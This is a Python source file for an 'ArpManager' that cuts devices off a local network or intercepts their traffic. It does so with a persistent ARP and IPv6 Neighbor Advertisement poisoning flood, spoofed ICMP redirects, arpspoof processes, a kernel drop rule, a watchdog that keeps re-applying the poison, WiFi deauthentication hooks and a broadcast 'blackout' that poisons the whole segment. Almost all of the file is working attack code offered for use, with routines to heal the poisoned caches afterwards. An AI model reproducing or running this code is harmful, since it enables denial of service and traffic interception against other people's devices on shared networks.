"""
network/arp.py — 5-Layer ArpManager: the godly cut engine.

Layer 1: nftables FORWARD DROP       — kernel, instant, survives everything
Layer 2: Scapy ARP flood @ 0.3 s    — poisons both caches, both directions
Layer 3: arpspoof binary bi-dir      — belt-and-suspenders fallback
Layer 4: Watchdog @ 0.5 s           — re-applies 1+2+3 if anything slips
Layer 5: WiFi Deauth (via deauth.py) — radio-level disconnect for WiFi clients

Dual-stack: when the target's and gateway's IPv6 addresses are known, the same
flood poisons the IPv6 neighbour pair with spoofed Neighbor Advertisements, so a
cut isn't silently bypassed over IPv6. restore() heals both stacks.

Proper restore(): re-resolves any missing MACs, sends real ARP/NA replies with
the correct gateway/target MACs to flush poisoned caches, undoes the injected
ICMP redirect, and returns ip_forward to the value captured before engage.
"""

from __future__ import annotations

import os
import re
import shutil
import signal
import socket
import subprocess
import threading
import time

from core.netutil import valid_ip, valid_ip6
from core.osutil import IS_WINDOWS as _IS_WINDOWS
from network.rawsock import RawL2Sender

try:
    from scapy.all import ARP, Ether, sendp, srp

    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    from scapy.all import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, IPv6

    SCAPY6_OK = True
except ImportError:
    SCAPY6_OK = False


class ArpManager:
    ARP_INTERVAL = 0.3  # seconds between ARP flood bursts (3× faster than old)
    WATCHDOG_INTERVAL = 0.5  # seconds between watchdog re-apply sweeps (2× faster than old)
    RESOLVE_INTERVAL = 15.0  # seconds between watchdog MAC re-resolution attempts per target

    def __init__(self):
        self._lock = threading.Lock()
        self._cut_ips: dict[str, dict] = {}  # ip → {gateway, iface, target_mac, gw_mac, my_mac}
        self._procs: dict[str, list] = {}  # ip → [arpspoof procs]
        self._flood_stops: dict[str, threading.Event] = {}
        self._watchdog_running = False
        # Optional deauth manager (injected externally if WiFi)
        self.deauth_mgr = None
        # FORWARD-DROP backend (nftables), injected by the controller
        # (self.arp.nft = self.nft). None when ArpManager is used standalone,
        # in which case the L1 kernel drop is skipped (ARP poisoning still runs).
        self.nft = None
        self._safe_mode = False
        # ip_forward value captured before the first spoof forced it on, so a
        # full teardown can put it back (capture-or-None; None = we never changed
        # it or already restored it). Owned by this module for standalone use;
        # in the integrated app system.netinfo also captures/restores it.
        self._orig_ip_forward: str | None = None
        # Segment blackout state (broadcast gateway poison; separate from cuts).
        self._blackout: dict = {}
        self._blackout_stop: threading.Event | None = None

    def set_safe_mode(self, enabled: bool):
        self._safe_mode = enabled
        self.ARP_INTERVAL = 1.0 if enabled else 0.3
        self.WATCHDOG_INTERVAL = 2.0 if enabled else 0.5
        self.RESOLVE_INTERVAL = 30.0 if enabled else 15.0

    # ── Public API ──────────────────────────────────────────────────────────

    def cut(
        self,
        ip: str,
        gateway: str,
        iface: str,
        my_ip: str,
        target_ip6: str = "",
        gateway_ip6: str = "",
    ) -> bool:
        """Apply a persistent cut using all 5 layers."""
        if not valid_ip(ip) or not valid_ip(gateway):
            return False
        # L1: kernel DROP
        self._apply_drop(ip)
        # Poisoning layers (L2-L5)
        return self.spoof(
            ip, gateway, iface, my_ip, mode="cut", target_ip6=target_ip6, gateway_ip6=gateway_ip6
        )

    def spoof(
        self,
        ip: str,
        gateway: str,
        iface: str,
        my_ip: str,
        mode: str = "spoof",
        target_ip6: str = "",
        gateway_ip6: str = "",
    ) -> bool:
        """Poison the ARP cache to intercept traffic without dropping it (Monitoring)."""
        if not valid_ip(ip) or not valid_ip(gateway):
            return False
        # Never poison ourselves or the gateway (defence-in-depth; the controller
        # also guards this, but a direct/standalone caller must not be able to
        # redirect our own or the gateway's traffic to us).
        if ip == gateway or (my_ip and ip == my_ip):
            return False
        # Only keep IPv6 addresses we can actually use; junk is dropped to "".
        t6 = target_ip6 if valid_ip6(target_ip6) else ""
        g6 = gateway_ip6 if valid_ip6(gateway_ip6) else ""
        target_mac, gw_mac, my_mac = self._resolve_macs(ip, gateway, iface)

        with self._lock:
            self._cut_ips[ip] = {
                "gateway": gateway,
                "iface": iface,
                "my_ip": my_ip,
                "target_mac": target_mac,
                "gw_mac": gw_mac,
                "my_mac": my_mac,
                "mode": mode,
                "target_ip6": t6,
                "gateway_ip6": g6,
                "next_resolve": time.monotonic() + self.RESOLVE_INTERVAL,
            }

        if not target_mac:
            return False  # Cannot spoof without target MAC

        # Ensure IP Forwarding is on (capturing the original once, so a full
        # teardown can restore it).
        self._enable_forwarding()

        # L2: Scapy ARP (+ IPv6 NA) flood
        if SCAPY_OK and my_mac:
            self._start_flood(ip, gateway, iface, target_mac, gw_mac, my_mac, my_ip)

        # L3: arpspoof binary fallback
        self._start_arpspoof(ip, gateway, iface)

        # L4: Watchdog
        if not self._watchdog_running:
            self._watchdog_running = True
            threading.Thread(target=self._watchdog, daemon=True, name="arp_watchdog").start()

        # Optional WiFi deauth (only for cuts)
        # Note: We usually don't deauth for monitoring as it disconnects the user
        return True

    def restore(self, ip: str):
        """Remove all cut layers and restore ARP/NA caches properly.

        Every step is isolated so a failure in one (e.g. nft.uncut raising) can
        never skip the cache heal that follows — otherwise a device could be left
        poisoned after a "restore".
        """
        self._stop_flood(ip)

        with self._lock:
            info = self._cut_ips.pop(ip, {})
            procs = self._procs.pop(ip, [])

        if self.deauth_mgr:
            try:
                self.deauth_mgr.stop(ip)
                t_mac = info.get("target_mac")
                if t_mac:
                    self.deauth_mgr.stop_pmf_bypass(t_mac)
            except Exception:
                pass

        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:
                try:
                    p.terminate()
                except Exception:
                    pass

        # Re-resolve any MAC we never learned (target offline at cut time, or the
        # gateway MAC changed) so the corrective replies below can actually heal.
        if info and SCAPY_OK and (not info.get("target_mac") or not info.get("gw_mac")):
            t2, g2, _m2 = self._resolve_macs(ip, info.get("gateway", ""), info.get("iface", ""))
            if t2 and not info.get("target_mac"):
                info["target_mac"] = t2
            if g2 and not info.get("gw_mac"):
                info["gw_mac"] = g2

        # Remove the kernel DROP — isolated so a failure here can't skip the heal.
        try:
            self._remove_drop(ip)
        except Exception:
            pass

        # Send real ARP/NA replies and undo the injected redirect to heal caches.
        if info and SCAPY_OK:
            try:
                self._send_restore(
                    ip,
                    info.get("target_mac", ""),
                    info.get("gateway", ""),
                    info.get("gw_mac", ""),
                    info.get("my_mac", ""),
                    info.get("iface", ""),
                    info.get("target_ip6", ""),
                    info.get("gateway_ip6", ""),
                )
            except Exception:
                pass

        # If this was the last active cut, let the idle watchdog stop and put
        # ip_forward back to the value we captured before forcing it on.
        with self._lock:
            idle = not self._cut_ips
        if idle:
            self._watchdog_running = False
        self._maybe_restore_forwarding()

    def restore_all(self):
        with self._lock:
            ips = list(self._cut_ips.keys())
        # Isolate each restore so one failing target can't abort the rest — a
        # partial restore must still heal every other poisoned device.
        for ip in ips:
            try:
                self.restore(ip)
            except Exception:
                pass
        # Final safety net regardless of per-IP outcomes.
        self._maybe_restore_forwarding()

    def stop_watchdog(self):
        self._watchdog_running = False
        with self._lock:
            stops = list(self._flood_stops.values())
        for evt in stops:
            evt.set()

    # ── ip_forward capture / restore ──────────────────────────────────────────

    @staticmethod
    def _read_ip_forward() -> str:
        try:
            r = subprocess.run(
                ["sysctl", "-n", "net.ipv4.ip_forward"], capture_output=True, text=True
            )
            v = r.stdout.strip()
            return v if v in ("0", "1") else "1"
        except (OSError, subprocess.SubprocessError):
            return "1"

    def _enable_forwarding(self):
        if _IS_WINDOWS:
            return
        with self._lock:
            if self._orig_ip_forward is None:
                self._orig_ip_forward = self._read_ip_forward()
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

    def _maybe_restore_forwarding(self):
        """Restore ip_forward to its captured original — only when no cuts remain,
        so one restored device among several doesn't kill forwarding for the rest.
        Idempotent: the captured value is cleared once restored."""
        if _IS_WINDOWS:
            return
        with self._lock:
            if self._cut_ips:
                return
            orig = self._orig_ip_forward
            self._orig_ip_forward = None
        if orig is not None:
            subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={orig}"], capture_output=True)

    # ── Segment blackout (broadcast gateway poison) ───────────────────────────

    def blackout_start(self, gateway: str, iface: str, my_ip: str) -> bool:
        """Broadcast-poison the WHOLE segment's ARP for the gateway.

        Floods a gratuitous ARP to ff:ff:ff:ff:ff:ff claiming the gateway's IP is
        at OUR MAC, so every host on the segment — including ones not in any scan
        table (guests, rogue boxes, late joiners) — routes its gateway traffic to
        us. Unlike cut()/_build_l2_frames (which is deliberately unicast and
        target-scoped), this IS segment-wide on purpose. The caller pairs it with
        an nft FORWARD drop to blackhole the redirected traffic.

        The operator stays online: we pin OUR OWN neighbor entry for the gateway
        to the real gateway MAC (nud permanent), and we never poison our own IP,
        so the gateway still reaches us. Returns False if the MACs can't resolve.
        """
        if not valid_ip(gateway) or not SCAPY_OK:
            return False
        _t, gw_mac, my_mac = self._resolve_macs(gateway, gateway, iface)
        if not my_mac or not gw_mac:
            return False

        # Pin our own gateway neighbor so the blackout never takes us offline.
        if not _IS_WINDOWS:
            subprocess.run(
                [
                    "ip",
                    "neigh",
                    "replace",
                    gateway,
                    "lladdr",
                    gw_mac,
                    "dev",
                    iface,
                    "nud",
                    "permanent",
                ],
                capture_output=True,
            )

        stop_evt = threading.Event()
        with self._lock:
            self._blackout = {"gateway": gateway, "iface": iface, "gw_mac": gw_mac}
            self._blackout_stop = stop_evt

        def _flood():
            frames = [
                Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff")
                / ARP(op=2, hwsrc=my_mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway),
                Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff")
                / ARP(op=1, hwsrc=my_mac, psrc=gateway, hwdst="00:00:00:00:00:00", pdst=gateway),
            ]
            raw = RawL2Sender(iface)
            raw_bytes = [bytes(f) for f in frames] if raw.available else []
            try:
                while not stop_evt.is_set():
                    try:
                        if raw.available:
                            for i, fb in enumerate(raw_bytes):
                                if not raw.send(fb):
                                    sendp(frames[i], iface=iface, verbose=False)
                        else:
                            for pkt in frames:
                                sendp(pkt, iface=iface, verbose=False)
                    except Exception:
                        pass
                    stop_evt.wait(self.ARP_INTERVAL)
            finally:
                raw.close()

        threading.Thread(target=_flood, daemon=True, name="arp_blackout").start()
        return True

    def blackout_stop(self):
        """Stop the broadcast poison, heal the segment with the real gateway MAC,
        and release our pinned gateway neighbor. Idempotent."""
        if self._blackout_stop:
            self._blackout_stop.set()
        with self._lock:
            info = self._blackout
            self._blackout = {}
            self._blackout_stop = None
        if not info:
            return
        gateway, iface, gw_mac = info["gateway"], info["iface"], info["gw_mac"]
        # Heal: broadcast the REAL gateway MAC so poisoned caches recover.
        if SCAPY_OK and gw_mac:
            try:
                heal = Ether(src=gw_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, hwsrc=gw_mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway
                )
                sendp(heal, iface=iface, count=20, inter=0.05, verbose=False)
            except Exception:
                pass
        # Release our pinned neighbor (back to dynamic).
        if not _IS_WINDOWS:
            subprocess.run(["ip", "neigh", "del", gateway, "dev", iface], capture_output=True)

    # ── MAC resolution ──────────────────────────────────────────────────────

    def _resolve_macs(self, target_ip: str, gateway_ip: str, iface: str):
        """
        Resolve target MAC, gateway MAC, and our own MAC via Scapy ARP probes.
        Returns (target_mac, gw_mac, my_mac) — any can be "" on failure.
        """
        target_mac = gw_mac = my_mac = ""
        if not SCAPY_OK:
            return target_mac, gw_mac, my_mac

        # Our MAC via ioctl
        try:
            import fcntl
            import struct

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                raw = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", iface[:15].encode()))
                my_mac = ":".join(f"{b:02x}" for b in raw[18:24])
            finally:
                s.close()
        except Exception:
            pass

        # Use Scapy first, then fallback to 'arp -n' system table
        for probe_ip, field in [(target_ip, "target_mac"), (gateway_ip, "gw_mac")]:
            # Try to force resolution by pinging if Scapy ARP fails
            try:
                # Use system ping to force an ARP table entry (flags differ by OS).
                if _IS_WINDOWS:
                    ping_cmd = ["ping", "-n", "1", "-w", "1000", probe_ip]
                else:
                    ping_cmd = ["ping", "-c", "1", "-W", "1", probe_ip]
                subprocess.run(ping_cmd, capture_output=True, timeout=2)
            except Exception:
                pass

            # Scapy probe (retries once)
            for _ in range(2):
                try:
                    ans, _ = srp(
                        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=probe_ip),
                        iface=iface,
                        timeout=2,
                        verbose=False,
                    )
                    if ans:
                        mac = ans[0][1].hwsrc
                        if field == "target_mac":
                            target_mac = mac
                        else:
                            gw_mac = mac
                        break
                except Exception:
                    pass

            # ARP Table fallback (Windows: `arp -a` uses dashes; Linux: `arp -n`)
            if (field == "target_mac" and not target_mac) or (field == "gw_mac" and not gw_mac):
                try:
                    arp_cmd = ["arp", "-a", probe_ip] if _IS_WINDOWS else ["arp", "-n", probe_ip]
                    r = subprocess.run(arp_cmd, capture_output=True, text=True)
                    m = re.search(r"(([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", r.stdout)
                    if m:
                        mac = m.group(1).replace("-", ":")
                        if field == "target_mac":
                            target_mac = mac
                        else:
                            gw_mac = mac
                except Exception:
                    pass

        return target_mac, gw_mac, my_mac

    # ── Layer 1: nftables FORWARD DROP ───────────────────────────────────────

    def _apply_drop(self, ip: str):
        # The kernel FORWARD drop is owned by the shared NftFilter (DROP inserted
        # above the accounting ACCEPT). Skipped if no filter was injected.
        if self.nft is not None:
            self.nft.cut(ip)

    def _remove_drop(self, ip: str):
        if self.nft is not None:
            self.nft.uncut(ip)

    # ── Layer 2: Scapy ARP flood ─────────────────────────────────────────────

    @staticmethod
    def _build_l2_frames(ip: str, gateway: str, target_mac: str, gw_mac: str, my_mac: str) -> list:
        """Build the *unicast* ARP-poison frames for a single targeted cut.

        Returns L2 Ether/ARP frames that poison only the target↔gateway pair:
          - to TARGET  (unicast → target_mac): "gateway's IP is at my MAC"
          - to GATEWAY (unicast → gw_mac):     "target's IP is at my MAC"
        each as an OP=2 reply + OP=1 request for cache-update compatibility.

        It deliberately emits NO broadcast frame. The previous flood blasted a
        gratuitous ARP claiming the *gateway's* IP was at our MAC to
        ff:ff:ff:ff:ff:ff, which rewrote the gateway entry on *every* host on the
        segment — so cutting one device routed the whole subnet through us (and
        knocked it offline). A targeted cut must touch only its target and the
        gateway; if the gateway MAC is unknown we skip that half rather than
        broadcast-poison the segment.
        """
        frames: list = []
        # To TARGET: gateway's IP is at my MAC (unicast only).
        frames.append(
            Ether(src=my_mac, dst=target_mac)
            / ARP(op=2, hwsrc=my_mac, psrc=gateway, hwdst=target_mac, pdst=ip)
        )
        frames.append(
            Ether(src=my_mac, dst=target_mac)
            / ARP(op=1, hwsrc=my_mac, psrc=gateway, hwdst="00:00:00:00:00:00", pdst=ip)
        )
        # To GATEWAY: target's IP is at my MAC (unicast only; skip if MAC unknown).
        if gw_mac:
            frames.append(
                Ether(src=my_mac, dst=gw_mac)
                / ARP(op=2, hwsrc=my_mac, psrc=ip, hwdst=gw_mac, pdst=gateway)
            )
            frames.append(
                Ether(src=my_mac, dst=gw_mac)
                / ARP(op=1, hwsrc=my_mac, psrc=ip, hwdst="00:00:00:00:00:00", pdst=gateway)
            )
        return frames

    @staticmethod
    def _build_na_frames(
        target_ip6: str, gateway_ip6: str, target_mac: str, gw_mac: str, my_mac: str
    ) -> list:
        """Build the *unicast* IPv6 Neighbor-Advertisement poison frames.

        Dual-stack analogue of _build_l2_frames: poisons only the target↔gateway
        IPv6 neighbour pair (the target's L2 address is the same for both stacks,
        so the ARP-resolved MACs are reused):
          - to TARGET  (unicast → target_mac): "gateway's IPv6 is at my MAC" (R=1)
          - to GATEWAY (unicast → gw_mac):     "target's IPv6 is at my MAC"  (R=0)
        Each is an unsolicited NA with the Override flag set. No multicast frame
        is emitted, so the poison never spills onto the whole segment. Empty when
        IPv6 scapy support or the required addresses/MACs are missing.
        """
        frames: list = []
        if not (SCAPY6_OK and target_ip6 and gateway_ip6 and target_mac and my_mac):
            return frames
        # To TARGET: we are the gateway (router flag set).
        frames.append(
            Ether(src=my_mac, dst=target_mac)
            / IPv6(src=gateway_ip6, dst=target_ip6)
            / ICMPv6ND_NA(tgt=gateway_ip6, R=1, S=0, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=my_mac)
        )
        # To GATEWAY: we are the target (host, router flag clear). Skip if unknown.
        if gw_mac:
            frames.append(
                Ether(src=my_mac, dst=gw_mac)
                / IPv6(src=target_ip6, dst=gateway_ip6)
                / ICMPv6ND_NA(tgt=target_ip6, R=0, S=0, O=1)
                / ICMPv6NDOptDstLLAddr(lladdr=my_mac)
            )
        return frames

    def _start_flood(
        self,
        ip: str,
        gateway: str,
        iface: str,
        target_mac: str,
        gw_mac: str,
        my_mac: str,
        my_ip: str,
    ):
        # Don't start (or let the watchdog restart) a flood for an IP that
        # restore() has already removed — that would leak a poisoning thread
        # that keeps spoofing after the device was "restored".
        with self._lock:
            if ip not in self._cut_ips:
                return
            v6 = self._cut_ips[ip]
            target_ip6 = v6.get("target_ip6", "")
            gateway_ip6 = v6.get("gateway_ip6", "")
        self._stop_flood(ip)
        stop_evt = threading.Event()
        with self._lock:
            if ip not in self._cut_ips:  # restored during _stop_flood
                return
            self._flood_stops[ip] = stop_evt

        def _flood():
            # Unicast target↔gateway poison frames (A/B). Scoped to this target
            # only — no subnet-wide broadcast (see _build_l2_frames). IPv6 NA
            # frames poison the dual-stack path the same way, when known.
            l2_frames = self._build_l2_frames(ip, gateway, target_mac, gw_mac, my_mac)
            l2_frames += self._build_na_frames(target_ip6, gateway_ip6, target_mac, gw_mac, my_mac)

            # Packet C: ICMP Redirect — tells the TARGET (unicast, dst=ip) that
            # the gateway is better reached via us. Only when both MACs are known.
            if target_mac and gw_mac:
                try:
                    from scapy.all import ICMP, IP, send

                    pkt_redirect = IP(src=gateway, dst=ip) / ICMP(type=5, code=1, gw=my_ip)
                except ImportError:
                    pkt_redirect = None
            else:
                pkt_redirect = None

            # scapy builds, a raw AF_PACKET socket sends. Serialise the static L2
            # frames once; blast the bytes each iteration. Falls back to scapy
            # sendp when the raw socket isn't available (non-root) or a send fails
            # mid-loop, so behaviour is never worse.
            raw = RawL2Sender(iface)
            raw_bytes = [bytes(p) for p in l2_frames] if raw.available else []

            # Absolute-deadline pacing so time spent sending doesn't accumulate
            # into drift: each burst fires on an ARP_INTERVAL grid, not
            # "interval after the previous burst finished".
            next_t = time.monotonic()
            try:
                while not stop_evt.is_set():
                    try:
                        if raw.available:
                            for i, frame in enumerate(raw_bytes):
                                if not raw.send(frame):
                                    sendp(l2_frames[i], iface=iface, verbose=False)
                        else:
                            for pkt in l2_frames:
                                sendp(pkt, iface=iface, verbose=False)
                        if pkt_redirect:
                            send(pkt_redirect, verbose=False, count=2)  # L3 (routed) — scapy
                    except Exception:
                        pass
                    next_t += self.ARP_INTERVAL
                    delay = next_t - time.monotonic()
                    if delay < 0:
                        # Fell behind (slow send / scheduler); resync the grid.
                        next_t = time.monotonic()
                        delay = 0
                    stop_evt.wait(delay)
            finally:
                raw.close()

        threading.Thread(target=_flood, daemon=True, name=f"arp_flood_{ip}").start()

    def _stop_flood(self, ip: str):
        with self._lock:
            evt = self._flood_stops.pop(ip, None)
        if evt:
            evt.set()

    # ── Layer 3: arpspoof binary fallback ────────────────────────────────────

    def _start_arpspoof(self, ip: str, gateway: str, iface: str):
        arpspoof = shutil.which("arpspoof")
        if not arpspoof:
            return
        with self._lock:
            # Bail before spawning if the IP is no longer an active target
            # (restore() popped it): processes spawned below would otherwise be
            # untracked and keep poisoning after "restore".
            if ip not in self._cut_ips:
                return
            old = self._procs.pop(ip, [])
        for p in old:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:
                pass

        procs = []
        for target, spoof in [(ip, gateway), (gateway, ip)]:
            try:
                p = subprocess.Popen(
                    [arpspoof, "-i", iface, "-t", target, spoof],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=os.setsid,
                )
                procs.append(p)
            except Exception:
                pass

        with self._lock:
            if ip in self._cut_ips:
                self._procs[ip] = procs
                procs = []
        # If restore() removed the IP while we were spawning, kill what we just
        # made instead of orphaning it.
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:
                try:
                    p.terminate()
                except Exception:
                    pass

    # ── Restore ARP / NA caches ──────────────────────────────────────────────

    def _send_restore(
        self,
        ip: str,
        target_mac: str,
        gateway: str,
        gw_mac: str,
        my_mac: str,
        iface: str,
        target_ip6: str = "",
        gateway_ip6: str = "",
    ):
        """Send real ARP/NA replies to flush poisoned caches on both sides and
        undo the injected ICMP redirect route."""
        try:
            pkts = []
            # To TARGET: "gateway's IP is at GATEWAY's real mac"
            if target_mac and gw_mac:
                pkts.append(
                    Ether(src=gw_mac, dst=target_mac)
                    / ARP(op=2, hwsrc=gw_mac, psrc=gateway, hwdst=target_mac, pdst=ip)
                )
            # To GATEWAY: "target's IP is at TARGET's real mac"
            if gw_mac and target_mac:
                pkts.append(
                    Ether(src=target_mac, dst=gw_mac)
                    / ARP(op=2, hwsrc=target_mac, psrc=ip, hwdst=gw_mac, pdst=gateway)
                )
            for pkt in pkts:
                sendp(pkt, iface=iface, count=20, inter=0.05, verbose=False)
        except Exception:
            pass

        # Undo the ICMP redirect we injected during the flood: point the target's
        # gateway host-route back at the real gateway (gw = the gateway itself).
        if target_mac and gw_mac:
            try:
                from scapy.all import ICMP, IP, send

                send(
                    IP(src=gateway, dst=ip) / ICMP(type=5, code=1, gw=gateway),
                    count=2,
                    verbose=False,
                )
            except Exception:
                pass

        # IPv6 heal: re-advertise the real gateway/target link-layer addresses.
        if SCAPY6_OK and target_ip6 and gateway_ip6 and target_mac and gw_mac:
            try:
                na = [
                    # To TARGET: gateway_ip6 is at the gateway's real MAC.
                    Ether(src=gw_mac, dst=target_mac)
                    / IPv6(src=gateway_ip6, dst=target_ip6)
                    / ICMPv6ND_NA(tgt=gateway_ip6, R=1, S=0, O=1)
                    / ICMPv6NDOptDstLLAddr(lladdr=gw_mac),
                    # To GATEWAY: target_ip6 is at the target's real MAC.
                    Ether(src=target_mac, dst=gw_mac)
                    / IPv6(src=target_ip6, dst=gateway_ip6)
                    / ICMPv6ND_NA(tgt=target_ip6, R=0, S=0, O=1)
                    / ICMPv6NDOptDstLLAddr(lladdr=target_mac),
                ]
                for pkt in na:
                    sendp(pkt, iface=iface, count=20, inter=0.05, verbose=False)
            except Exception:
                pass

    # ── Layer 4: Watchdog ────────────────────────────────────────────────────

    def _watchdog(self):
        while self._watchdog_running:
            time.sleep(self.WATCHDOG_INTERVAL)
            with self._lock:
                targets = dict(self._cut_ips)
            if not targets:
                continue
            for ip, info in targets.items():
                # The snapshot may be stale: skip anything restore() removed
                # between the snapshot and now, so we don't re-arm a just-lifted
                # cut (which would also re-leak flood/arpspoof).
                with self._lock:
                    if ip not in self._cut_ips:
                        continue

                # Re-resolve MACs on a bounded cadence, or immediately if one is
                # still missing (target was offline at cut time, or the gateway
                # MAC changed under us — otherwise the poison targets a stale or
                # empty MAC and the cut silently does nothing).
                info = self._maybe_reresolve(ip, info)

                # Re-enforce DROP only if in cut mode
                if info.get("mode") == "cut":
                    self._apply_drop(ip)

                # Restart flood if dead
                with self._lock:
                    evt = self._flood_stops.get(ip)
                    alive = evt is not None and not evt.is_set()
                if not alive and SCAPY_OK and info.get("my_mac"):
                    self._start_flood(
                        ip,
                        info["gateway"],
                        info["iface"],
                        info.get("target_mac", ""),
                        info.get("gw_mac", ""),
                        info["my_mac"],
                        info.get("my_ip", ""),
                    )

                # Restart dead arpspoof processes
                with self._lock:
                    procs = self._procs.get(ip, [])
                if shutil.which("arpspoof"):
                    dead = any(p.poll() is not None for p in procs) if procs else True
                    if dead:
                        self._start_arpspoof(ip, info["gateway"], info["iface"])

    def _maybe_reresolve(self, ip: str, info: dict) -> dict:
        """Re-resolve the target/gateway MACs when due or when one is missing.

        On a change, the stored entry is updated and the flood is torn down so
        the watchdog restarts it with the fresh MACs on the same pass. Returns
        the (possibly refreshed) info dict to use for this sweep.
        """
        now = time.monotonic()
        missing = not info.get("target_mac") or not info.get("gw_mac")
        due = now >= info.get("next_resolve", 0.0)
        if not (missing or due):
            return info
        if not SCAPY_OK:
            return info

        t2, g2, m2 = self._resolve_macs(ip, info.get("gateway", ""), info.get("iface", ""))
        changed = False
        with self._lock:
            cur = self._cut_ips.get(ip)
            if cur is None:  # restored mid-resolve
                return info
            if t2 and t2 != cur.get("target_mac"):
                cur["target_mac"] = t2
                changed = True
            if g2 and g2 != cur.get("gw_mac"):
                cur["gw_mac"] = g2
                changed = True
            if m2 and not cur.get("my_mac"):
                cur["my_mac"] = m2
                changed = True
            cur["next_resolve"] = now + self.RESOLVE_INTERVAL
            info = dict(cur)
        if changed:
            # Force the flood to be rebuilt with the new MACs this same sweep.
            self._stop_flood(ip)
        return info
